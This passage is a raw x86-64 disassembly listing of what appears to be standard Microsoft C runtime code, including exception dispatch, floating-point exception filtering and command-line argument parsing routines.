   140005dfd:	00 00 00 
   140005e00:	48 83 ec 28          	sub    $0x28,%rsp
   140005e04:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140005e09:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140005e0e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140005e13:	48 8b 12             	mov    (%rdx),%rdx
   140005e16:	48 8b c1             	mov    %rcx,%rax
   140005e19:	e8 32 e1 ff ff       	call   0x140003f50
   140005e1e:	ff d0                	call   *%rax
   140005e20:	e8 5b e1 ff ff       	call   0x140003f80
   140005e25:	48 8b c8             	mov    %rax,%rcx
   140005e28:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140005e2d:	48 8b 12             	mov    (%rdx),%rdx
   140005e30:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140005e36:	e8 15 e1 ff ff       	call   0x140003f50
   140005e3b:	48 83 c4 28          	add    $0x28,%rsp
   140005e3f:	c3                   	ret
   140005e40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005e45:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005e4a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005e4f:	57                   	push   %rdi
   140005e50:	48 83 ec 20          	sub    $0x20,%rsp
   140005e54:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   140005e58:	48 8b fa             	mov    %rdx,%rdi
   140005e5b:	48 8b d9             	mov    %rcx,%rbx
   140005e5e:	74 47                	je     0x140005ea7
   140005e60:	48 8b 09             	mov    (%rcx),%rcx
   140005e63:	48 85 c9             	test   %rcx,%rcx
   140005e66:	74 3f                	je     0x140005ea7
   140005e68:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005e6c:	48 ff c0             	inc    %rax
   140005e6f:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140005e73:	75 f7                	jne    0x140005e6c
   140005e75:	48 8d 68 01          	lea    0x1(%rax),%rbp
   140005e79:	48 8b cd             	mov    %rbp,%rcx
   140005e7c:	e8 df 13 00 00       	call   0x140007260
   140005e81:	48 8b f0             	mov    %rax,%rsi
   140005e84:	48 85 c0             	test   %rax,%rax
   140005e87:	74 15                	je     0x140005e9e
   140005e89:	4c 8b 03             	mov    (%rbx),%r8
   140005e8c:	48 8b d5             	mov    %rbp,%rdx
   140005e8f:	48 8b c8             	mov    %rax,%rcx
   140005e92:	e8 d9 13 00 00       	call   0x140007270
   140005e97:	48 89 37             	mov    %rsi,(%rdi)
   140005e9a:	c6 47 08 01          	movb   $0x1,0x8(%rdi)
   140005e9e:	33 c9                	xor    %ecx,%ecx
   140005ea0:	e8 ab 13 00 00       	call   0x140007250
   140005ea5:	eb 0a                	jmp    0x140005eb1
   140005ea7:	48 8b 03             	mov    (%rbx),%rax
   140005eaa:	48 89 02             	mov    %rax,(%rdx)
   140005ead:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   140005eb1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005eb6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005ebb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005ec0:	48 83 c4 20          	add    $0x20,%rsp
   140005ec4:	5f                   	pop    %rdi
   140005ec5:	c3                   	ret
   140005ec6:	cc                   	int3
   140005ec7:	cc                   	int3
   140005ec8:	40 53                	rex push %rbx
   140005eca:	48 83 ec 20          	sub    $0x20,%rsp
   140005ece:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   140005ed2:	48 8b d9             	mov    %rcx,%rbx
   140005ed5:	74 08                	je     0x140005edf
   140005ed7:	48 8b 09             	mov    (%rcx),%rcx
   140005eda:	e8 71 13 00 00       	call   0x140007250
   140005edf:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   140005ee3:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140005eea:	48 83 c4 20          	add    $0x20,%rsp
   140005eee:	5b                   	pop    %rbx
   140005eef:	c3                   	ret
   140005ef0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005ef5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005efa:	57                   	push   %rdi
   140005efb:	48 83 ec 50          	sub    $0x50,%rsp
   140005eff:	48 8b da             	mov    %rdx,%rbx
   140005f02:	48 8b f1             	mov    %rcx,%rsi
   140005f05:	bf 20 05 93 19       	mov    $0x19930520,%edi
   140005f0a:	48 85 d2             	test   %rdx,%rdx
   140005f0d:	74 1d                	je     0x140005f2c
   140005f0f:	f6 02 10             	testb  $0x10,(%rdx)
   140005f12:	74 18                	je     0x140005f2c
   140005f14:	48 8b 09             	mov    (%rcx),%rcx
   140005f17:	48 83 c1 f8          	add    $0xfffffffffffffff8,%rcx
   140005f1b:	48 8b 01             	mov    (%rcx),%rax
   140005f1e:	48 8b 58 30          	mov    0x30(%rax),%rbx
   140005f22:	48 8b 40 40          	mov    0x40(%rax),%rax
   140005f26:	ff 15 64 a3 00 00    	call   *0xa364(%rip)        # 0x140010290
   140005f2c:	33 c0                	xor    %eax,%eax
   140005f2e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005f33:	48 85 db             	test   %rbx,%rbx
   140005f36:	74 22                	je     0x140005f5a
   140005f38:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005f3d:	48 8b cb             	mov    %rbx,%rcx
   140005f40:	ff 15 ba a1 00 00    	call   *0xa1ba(%rip)        # 0x140010100
   140005f46:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005f4b:	f6 03 08             	testb  $0x8,(%rbx)
   140005f4e:	75 05                	jne    0x140005f55
   140005f50:	48 85 c0             	test   %rax,%rax
   140005f53:	75 05                	jne    0x140005f5a
   140005f55:	bf 00 40 99 01       	mov    $0x1994000,%edi
   140005f5a:	ba 01 00 00 00       	mov    $0x1,%edx
   140005f5f:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140005f64:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   140005f69:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140005f6e:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   140005f73:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140005f78:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140005f7d:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   140005f81:	ff 15 71 a1 00 00    	call   *0xa171(%rip)        # 0x1400100f8
   140005f87:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140005f8c:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140005f91:	48 83 c4 50          	add    $0x50,%rsp
   140005f95:	5f                   	pop    %rdi
   140005f96:	c3                   	ret
   140005f97:	cc                   	int3
   140005f98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005f9d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005fa2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005fa7:	57                   	push   %rdi
   140005fa8:	48 83 ec 20          	sub    $0x20,%rsp
   140005fac:	48 8b f2             	mov    %rdx,%rsi
   140005faf:	8b f9                	mov    %ecx,%edi
   140005fb1:	e8 2a 19 00 00       	call   0x1400078e0
   140005fb6:	45 33 c9             	xor    %r9d,%r9d
   140005fb9:	48 8b d8             	mov    %rax,%rbx
   140005fbc:	48 85 c0             	test   %rax,%rax
   140005fbf:	74 1f                	je     0x140005fe0
   140005fc1:	48 8b 08             	mov    (%rax),%rcx
   140005fc4:	48 8b c1             	mov    %rcx,%rax
   140005fc7:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   140005fce:	49 3b c8             	cmp    %r8,%rcx
   140005fd1:	74 0d                	je     0x140005fe0
   140005fd3:	39 38                	cmp    %edi,(%rax)
   140005fd5:	74 20                	je     0x140005ff7
   140005fd7:	48 83 c0 10          	add    $0x10,%rax
   140005fdb:	49 3b c0             	cmp    %r8,%rax
   140005fde:	75 f3                	jne    0x140005fd3
   140005fe0:	33 c0                	xor    %eax,%eax
   140005fe2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005fe7:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005fec:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005ff1:	48 83 c4 20          	add    $0x20,%rsp
   140005ff5:	5f                   	pop    %rdi
   140005ff6:	c3                   	ret
   140005ff7:	48 85 c0             	test   %rax,%rax
   140005ffa:	74 e4                	je     0x140005fe0
   140005ffc:	4c 8b 40 08          	mov    0x8(%rax),%r8
   140006000:	4d 85 c0             	test   %r8,%r8
   140006003:	74 db                	je     0x140005fe0
   140006005:	49 83 f8 05          	cmp    $0x5,%r8
   140006009:	75 0a                	jne    0x140006015
   14000600b:	4c 89 48 08          	mov    %r9,0x8(%rax)
   14000600f:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   140006013:	eb cd                	jmp    0x140005fe2
   140006015:	49 83 f8 01          	cmp    $0x1,%r8
   140006019:	75 05                	jne    0x140006020
   14000601b:	83 c8 ff             	or     $0xffffffff,%eax
   14000601e:	eb c2                	jmp    0x140005fe2
   140006020:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   140006024:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   140006028:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   14000602c:	0f 85 b9 00 00 00    	jne    0x1400060eb
   140006032:	48 83 c1 30          	add    $0x30,%rcx
   140006036:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   14000603d:	eb 08                	jmp    0x140006047
   14000603f:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   140006043:	48 83 c1 10          	add    $0x10,%rcx
   140006047:	48 3b ca             	cmp    %rdx,%rcx
   14000604a:	75 f3                	jne    0x14000603f
   14000604c:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   140006052:	8b 7b 10             	mov    0x10(%rbx),%edi
   140006055:	74 7a                	je     0x1400060d1
   140006057:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   14000605d:	74 6b                	je     0x1400060ca
   14000605f:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   140006065:	74 5c                	je     0x1400060c3
   140006067:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   14000606d:	74 4d                	je     0x1400060bc
   14000606f:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   140006075:	74 3e                	je     0x1400060b5
   140006077:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   14000607d:	74 2f                	je     0x1400060ae
   14000607f:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   140006085:	74 20                	je     0x1400060a7
   140006087:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   14000608d:	74 11                	je     0x1400060a0
   14000608f:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   140006095:	8b d7                	mov    %edi,%edx
   140006097:	75 40                	jne    0x1400060d9
   140006099:	ba 8d 00 00 00       	mov    $0x8d,%edx
   14000609e:	eb 36                	jmp    0x1400060d6
   1400060a0:	ba 8e 00 00 00       	mov    $0x8e,%edx
   1400060a5:	eb 2f                	jmp    0x1400060d6
   1400060a7:	ba 85 00 00 00       	mov    $0x85,%edx
   1400060ac:	eb 28                	jmp    0x1400060d6
   1400060ae:	ba 8a 00 00 00       	mov    $0x8a,%edx
   1400060b3:	eb 21                	jmp    0x1400060d6
   1400060b5:	ba 84 00 00 00       	mov    $0x84,%edx
   1400060ba:	eb 1a                	jmp    0x1400060d6
   1400060bc:	ba 81 00 00 00       	mov    $0x81,%edx
   1400060c1:	eb 13                	jmp    0x1400060d6
   1400060c3:	ba 86 00 00 00       	mov    $0x86,%edx
   1400060c8:	eb 0c                	jmp    0x1400060d6
   1400060ca:	ba 83 00 00 00       	mov    $0x83,%edx
   1400060cf:	eb 05                	jmp    0x1400060d6
   1400060d1:	ba 82 00 00 00       	mov    $0x82,%edx
   1400060d6:	89 53 10             	mov    %edx,0x10(%rbx)
   1400060d9:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400060de:	49 8b c0             	mov    %r8,%rax
   1400060e1:	e8 2a 89 00 00       	call   0x14000ea10
   1400060e6:	89 7b 10             	mov    %edi,0x10(%rbx)
   1400060e9:	eb 0f                	jmp    0x1400060fa
   1400060eb:	8b 48 04             	mov    0x4(%rax),%ecx
   1400060ee:	4c 89 48 08          	mov    %r9,0x8(%rax)
   1400060f2:	49 8b c0             	mov    %r8,%rax
   1400060f5:	e8 16 89 00 00       	call   0x14000ea10
   1400060fa:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   1400060fe:	e9 18 ff ff ff       	jmp    0x14000601b
   140006103:	cc                   	int3
   140006104:	8b 05 0e 8c 01 00    	mov    0x18c0e(%rip),%eax        # 0x14001ed18
   14000610a:	c3                   	ret
   14000610b:	cc                   	int3
   14000610c:	89 0d 06 8c 01 00    	mov    %ecx,0x18c06(%rip)        # 0x14001ed18
   140006112:	c3                   	ret
   140006113:	cc                   	int3
   140006114:	cc                   	int3
   140006115:	cc                   	int3
   140006116:	cc                   	int3
   140006117:	cc                   	int3
   140006118:	cc                   	int3
   140006119:	cc                   	int3
   14000611a:	cc                   	int3
   14000611b:	cc                   	int3
   14000611c:	cc                   	int3
   14000611d:	cc                   	int3
   14000611e:	cc                   	int3
   14000611f:	cc                   	int3
   140006120:	48 89 0d f9 8b 01 00 	mov    %rcx,0x18bf9(%rip)        # 0x14001ed20
   140006127:	c3                   	ret
   140006128:	cc                   	int3
   140006129:	cc                   	int3
   14000612a:	cc                   	int3
   14000612b:	cc                   	int3
   14000612c:	cc                   	int3
   14000612d:	cc                   	int3
   14000612e:	cc                   	int3
   14000612f:	cc                   	int3
   140006130:	48 8b 15 c9 7e 01 00 	mov    0x17ec9(%rip),%rdx        # 0x14001e000
   140006137:	4c 8b c1             	mov    %rcx,%r8
   14000613a:	8b c2                	mov    %edx,%eax
   14000613c:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006141:	83 e0 3f             	and    $0x3f,%eax
   140006144:	2b c8                	sub    %eax,%ecx
   140006146:	49 d3 c8             	ror    %cl,%r8
   140006149:	4c 33 c2             	xor    %rdx,%r8
   14000614c:	4c 89 05 cd 8b 01 00 	mov    %r8,0x18bcd(%rip)        # 0x14001ed20
   140006153:	c3                   	ret
   140006154:	48 8b c4             	mov    %rsp,%rax
   140006157:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000615b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000615f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006163:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006167:	41 54                	push   %r12
   140006169:	41 56                	push   %r14
   14000616b:	41 57                	push   %r15
   14000616d:	48 83 ec 20          	sub    $0x20,%rsp
   140006171:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   140006176:	4d 8b e1             	mov    %r9,%r12
   140006179:	49 8b d8             	mov    %r8,%rbx
   14000617c:	4c 8b f2             	mov    %rdx,%r14
   14000617f:	48 8b f9             	mov    %rcx,%rdi
   140006182:	49 83 27 00          	andq   $0x0,(%r15)
   140006186:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   14000618d:	48 85 d2             	test   %rdx,%rdx
   140006190:	74 07                	je     0x140006199
   140006192:	48 89 1a             	mov    %rbx,(%rdx)
   140006195:	49 83 c6 08          	add    $0x8,%r14
   140006199:	40 32 ed             	xor    %bpl,%bpl
   14000619c:	80 3f 22             	cmpb   $0x22,(%rdi)
   14000619f:	75 0f                	jne    0x1400061b0
   1400061a1:	40 84 ed             	test   %bpl,%bpl
   1400061a4:	40 b6 22             	mov    $0x22,%sil
   1400061a7:	40 0f 94 c5          	sete   %bpl
   1400061ab:	48 ff c7             	inc    %rdi
   1400061ae:	eb 37                	jmp    0x1400061e7
   1400061b0:	49 ff 07             	incq   (%r15)
   1400061b3:	48 85 db             	test   %rbx,%rbx
   1400061b6:	74 07                	je     0x1400061bf
   1400061b8:	8a 07                	mov    (%rdi),%al
   1400061ba:	88 03                	mov    %al,(%rbx)
   1400061bc:	48 ff c3             	inc    %rbx
   1400061bf:	0f be 37             	movsbl (%rdi),%esi
   1400061c2:	48 ff c7             	inc    %rdi
   1400061c5:	8b ce                	mov    %esi,%ecx
   1400061c7:	e8 c0 37 00 00       	call   0x14000998c
   1400061cc:	85 c0                	test   %eax,%eax
   1400061ce:	74 12                	je     0x1400061e2
   1400061d0:	49 ff 07             	incq   (%r15)
   1400061d3:	48 85 db             	test   %rbx,%rbx
   1400061d6:	74 07                	je     0x1400061df
   1400061d8:	8a 07                	mov    (%rdi),%al
   1400061da:	88 03                	mov    %al,(%rbx)
   1400061dc:	48 ff c3             	inc    %rbx
   1400061df:	48 ff c7             	inc    %rdi
   1400061e2:	40 84 f6             	test   %sil,%sil
   1400061e5:	74 1c                	je     0x140006203
   1400061e7:	40 84 ed             	test   %bpl,%bpl
   1400061ea:	75 b0                	jne    0x14000619c
   1400061ec:	40 80 fe 20          	cmp    $0x20,%sil
   1400061f0:	74 06                	je     0x1400061f8
   1400061f2:	40 80 fe 09          	cmp    $0x9,%sil
   1400061f6:	75 a4                	jne    0x14000619c
   1400061f8:	48 85 db             	test   %rbx,%rbx
   1400061fb:	74 09                	je     0x140006206
   1400061fd:	c6 43 ff 00          	movb   $0x0,-0x1(%rbx)
   140006201:	eb 03                	jmp    0x140006206
   140006203:	48 ff cf             	dec    %rdi
   140006206:	40 32 f6             	xor    %sil,%sil
   140006209:	8a 07                	mov    (%rdi),%al
   14000620b:	84 c0                	test   %al,%al
   14000620d:	0f 84 d2 00 00 00    	je     0x1400062e5
   140006213:	3c 20                	cmp    $0x20,%al
   140006215:	74 04                	je     0x14000621b
   140006217:	3c 09                	cmp    $0x9,%al
   140006219:	75 07                	jne    0x140006222
   14000621b:	48 ff c7             	inc    %rdi
   14000621e:	8a 07                	mov    (%rdi),%al
   140006220:	eb f1                	jmp    0x140006213
   140006222:	84 c0                	test   %al,%al
   140006224:	0f 84 bb 00 00 00    	je     0x1400062e5
   14000622a:	4d 85 f6             	test   %r14,%r14
   14000622d:	74 07                	je     0x140006236
   14000622f:	49 89 1e             	mov    %rbx,(%r14)
   140006232:	49 83 c6 08          	add    $0x8,%r14
   140006236:	49 ff 04 24          	incq   (%r12)
   14000623a:	ba 01 00 00 00       	mov    $0x1,%edx
   14000623f:	33 c0                	xor    %eax,%eax
   140006241:	eb 05                	jmp    0x140006248
   140006243:	48 ff c7             	inc    %rdi
   140006246:	ff c0                	inc    %eax
   140006248:	8a 0f                	mov    (%rdi),%cl
   14000624a:	80 f9 5c             	cmp    $0x5c,%cl
   14000624d:	74 f4                	je     0x140006243
   14000624f:	80 f9 22             	cmp    $0x22,%cl
   140006252:	75 30                	jne    0x140006284
   140006254:	84 c2                	test   %al,%dl
   140006256:	75 18                	jne    0x140006270
   140006258:	40 84 f6             	test   %sil,%sil
   14000625b:	74 0a                	je     0x140006267
   14000625d:	38 4f 01             	cmp    %cl,0x1(%rdi)
   140006260:	75 05                	jne    0x140006267
   140006262:	48 ff c7             	inc    %rdi
   140006265:	eb 09                	jmp    0x140006270
   140006267:	33 d2                	xor    %edx,%edx
   140006269:	40 84 f6             	test   %sil,%sil
   14000626c:	40 0f 94 c6          	sete   %sil
   140006270:	d1 e8                	shr    $1,%eax
   140006272:	eb 10                	jmp    0x140006284
   140006274:	ff c8                	dec    %eax
   140006276:	48 85 db             	test   %rbx,%rbx
   140006279:	74 06                	je     0x140006281
   14000627b:	c6 03 5c             	movb   $0x5c,(%rbx)
   14000627e:	48 ff c3             	inc    %rbx
   140006281:	49 ff 07             	incq   (%r15)
   140006284:	85 c0                	test   %eax,%eax
   140006286:	75 ec                	jne    0x140006274
   140006288:	8a 07                	mov    (%rdi),%al
   14000628a:	84 c0                	test   %al,%al
   14000628c:	74 44                	je     0x1400062d2
   14000628e:	40 84 f6             	test   %sil,%sil
   140006291:	75 08                	jne    0x14000629b
   140006293:	3c 20                	cmp    $0x20,%al
   140006295:	74 3b                	je     0x1400062d2
   140006297:	3c 09                	cmp    $0x9,%al
   140006299:	74 37                	je     0x1400062d2
   14000629b:	85 d2                	test   %edx,%edx
   14000629d:	74 2b                	je     0x1400062ca
   14000629f:	48 85 db             	test   %rbx,%rbx
   1400062a2:	74 05                	je     0x1400062a9
   1400062a4:	88 03                	mov    %al,(%rbx)
   1400062a6:	48 ff c3             	inc    %rbx
   1400062a9:	0f be 0f             	movsbl (%rdi),%ecx
   1400062ac:	e8 db 36 00 00       	call   0x14000998c
   1400062b1:	85 c0                	test   %eax,%eax
   1400062b3:	74 12                	je     0x1400062c7
   1400062b5:	49 ff 07             	incq   (%r15)
   1400062b8:	48 ff c7             	inc    %rdi
   1400062bb:	48 85 db             	test   %rbx,%rbx
   1400062be:	74 07                	je     0x1400062c7
   1400062c0:	8a 07                	mov    (%rdi),%al
   1400062c2:	88 03                	mov    %al,(%rbx)
   1400062c4:	48 ff c3             	inc    %rbx
   1400062c7:	49 ff 07             	incq   (%r15)
   1400062ca:	48 ff c7             	inc    %rdi
   1400062cd:	e9 68 ff ff ff       	jmp    0x14000623a
   1400062d2:	48 85 db             	test   %rbx,%rbx
   1400062d5:	74 06                	je     0x1400062dd
   1400062d7:	c6 03 00             	movb   $0x0,(%rbx)
   1400062da:	48 ff c3             	inc    %rbx
   1400062dd:	49 ff 07             	incq   (%r15)
   1400062e0:	e9 24 ff ff ff       	jmp    0x140006209
   1400062e5:	4d 85 f6             	test   %r14,%r14
   1400062e8:	74 04                	je     0x1400062ee
   1400062ea:	49 83 26 00          	andq   $0x0,(%r14)
   1400062ee:	49 ff 04 24          	incq   (%r12)
   1400062f2:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400062f7:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400062fc:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006301:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140006306:	48 83 c4 20          	add    $0x20,%rsp
   14000630a:	41 5f                	pop    %r15
   14000630c:	41 5e                	pop    %r14
   14000630e:	41 5c                	pop    %r12
   140006310:	c3                   	ret
   140006311:	cc                   	int3
   140006312:	cc                   	int3
   140006313:	cc                   	int3
   140006314:	40 53                	rex push %rbx
   140006316:	48 83 ec 20          	sub    $0x20,%rsp
   14000631a:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140006321:	ff ff 1f 
   140006324:	4c 8b ca             	mov    %rdx,%r9
   140006327:	48 3b c8             	cmp    %rax,%rcx
   14000632a:	73 3d                	jae    0x140006369
   14000632c:	33 d2                	xor    %edx,%edx
   14000632e:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140006332:	49 f7 f0             	div    %r8
   140006335:	4c 3b c8             	cmp    %rax,%r9
   140006338:	73 2f                	jae    0x140006369
   14000633a:	48 c1 e1 03          	shl    $0x3,%rcx
   14000633e:	4d 0f af c8          	imul   %r8,%r9
   140006342:	48 8b c1             	mov    %rcx,%rax
   140006345:	48 f7 d0             	not    %rax
   140006348:	49 3b c1             	cmp    %r9,%rax
   14000634b:	76 1c                	jbe    0x140006369
   14000634d:	49 03 c9             	add    %r9,%rcx
   140006350:	ba 01 00 00 00       	mov    $0x1,%edx
   140006355:	e8 36 1c 00 00       	call   0x140007f90
   14000635a:	33 c9                	xor    %ecx,%ecx
   14000635c:	48 8b d8             	mov    %rax,%rbx
   14000635f:	e8 ac 1c 00 00       	call   0x140008010
   140006364:	48 8b c3             	mov    %rbx,%rax
   140006367:	eb 02                	jmp    0x14000636b
   140006369:	33 c0                	xor    %eax,%eax
   14000636b:	48 83 c4 20          	add    $0x20,%rsp
   14000636f:	5b                   	pop    %rbx
   140006370:	c3                   	ret
   140006371:	cc                   	int3
   140006372:	cc                   	int3
   140006373:	cc                   	int3
   140006374:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006379:	55                   	push   %rbp
   14000637a:	56                   	push   %rsi
   14000637b:	57                   	push   %rdi
   14000637c:	41 56                	push   %r14
   14000637e:	41 57                	push   %r15
   140006380:	48 8b ec             	mov    %rsp,%rbp
   140006383:	48 83 ec 30          	sub    $0x30,%rsp
   140006387:	33 ff                	xor    %edi,%edi
   140006389:	44 8b f1             	mov    %ecx,%r14d
   14000638c:	85 c9                	test   %ecx,%ecx
   14000638e:	0f 84 4a 01 00 00    	je     0x1400064de
   140006394:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140006397:	83 f8 01             	cmp    $0x1,%eax
   14000639a:	76 16                	jbe    0x1400063b2
   14000639c:	e8 cb 1b 00 00       	call   0x140007f6c
   1400063a1:	bf 16 00 00 00       	mov    $0x16,%edi
   1400063a6:	89 38                	mov    %edi,(%rax)
   1400063a8:	e8 17 1a 00 00       	call   0x140007dc4
   1400063ad:	e9 2c 01 00 00       	jmp    0x1400064de
   1400063b2:	e8 1d 32 00 00       	call   0x1400095d4
   1400063b7:	48 8d 1d 72 89 01 00 	lea    0x18972(%rip),%rbx        # 0x14001ed30
   1400063be:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400063c4:	48 8b d3             	mov    %rbx,%rdx
   1400063c7:	33 c9                	xor    %ecx,%ecx
   1400063c9:	e8 da 28 00 00       	call   0x140008ca8
   1400063ce:	48 8b 35 23 8b 01 00 	mov    0x18b23(%rip),%rsi        # 0x14001eef8
   1400063d5:	48 89 1d fc 8a 01 00 	mov    %rbx,0x18afc(%rip)        # 0x14001eed8
   1400063dc:	48 85 f6             	test   %rsi,%rsi
   1400063df:	74 05                	je     0x1400063e6
   1400063e1:	40 38 3e             	cmp    %dil,(%rsi)
   1400063e4:	75 03                	jne    0x1400063e9
   1400063e6:	48 8b f3             	mov    %rbx,%rsi
   1400063e9:	48 8d 45 48          	lea    0x48(%rbp),%rax
   1400063ed:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   1400063f1:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   1400063f5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400063fa:	45 33 c0             	xor    %r8d,%r8d
   1400063fd:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   140006401:	33 d2                	xor    %edx,%edx
   140006403:	48 8b ce             	mov    %rsi,%rcx
   140006406:	e8 49 fd ff ff       	call   0x140006154
   14000640b:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   14000640f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006415:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140006419:	49 8b cf             	mov    %r15,%rcx
   14000641c:	e8 f3 fe ff ff       	call   0x140006314
   140006421:	48 8b d8             	mov    %rax,%rbx
   140006424:	48 85 c0             	test   %rax,%rax
   140006427:	75 11                	jne    0x14000643a
   140006429:	e8 3e 1b 00 00       	call   0x140007f6c
   14000642e:	8d 7b 0c             	lea    0xc(%rbx),%edi
   140006431:	89 38                	mov    %edi,(%rax)
   140006433:	33 c9                	xor    %ecx,%ecx
   140006435:	e9 9f 00 00 00       	jmp    0x1400064d9
   14000643a:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   14000643e:	48 8b d3             	mov    %rbx,%rdx
   140006441:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140006445:	48 8b ce             	mov    %rsi,%rcx
   140006448:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   14000644c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006451:	e8 fe fc ff ff       	call   0x140006154
   140006456:	41 83 fe 01          	cmp    $0x1,%r14d
   14000645a:	75 14                	jne    0x140006470
   14000645c:	8b 45 40             	mov    0x40(%rbp),%eax
   14000645f:	ff c8                	dec    %eax
   140006461:	48 89 1d 80 8a 01 00 	mov    %rbx,0x18a80(%rip)        # 0x14001eee8
   140006468:	89 05 72 8a 01 00    	mov    %eax,0x18a72(%rip)        # 0x14001eee0
   14000646e:	eb c3                	jmp    0x140006433
   140006470:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   140006474:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140006478:	48 8b cb             	mov    %rbx,%rcx
   14000647b:	e8 04 27 00 00       	call   0x140008b84
   140006480:	8b f0                	mov    %eax,%esi
   140006482:	85 c0                	test   %eax,%eax
   140006484:	74 19                	je     0x14000649f
   140006486:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   14000648a:	e8 81 1b 00 00       	call   0x140008010
   14000648f:	48 8b cb             	mov    %rbx,%rcx
   140006492:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140006496:	e8 75 1b 00 00       	call   0x140008010
   14000649b:	8b fe                	mov    %esi,%edi
   14000649d:	eb 3f                	jmp    0x1400064de
   14000649f:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   1400064a3:	48 8b cf             	mov    %rdi,%rcx
   1400064a6:	48 8b c2             	mov    %rdx,%rax
   1400064a9:	48 39 3a             	cmp    %rdi,(%rdx)
   1400064ac:	74 0c                	je     0x1400064ba
   1400064ae:	48 8d 40 08          	lea    0x8(%rax),%rax
   1400064b2:	48 ff c1             	inc    %rcx
   1400064b5:	48 39 38             	cmp    %rdi,(%rax)
   1400064b8:	75 f4                	jne    0x1400064ae
   1400064ba:	89 0d 20 8a 01 00    	mov    %ecx,0x18a20(%rip)        # 0x14001eee0
   1400064c0:	33 c9                	xor    %ecx,%ecx
   1400064c2:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
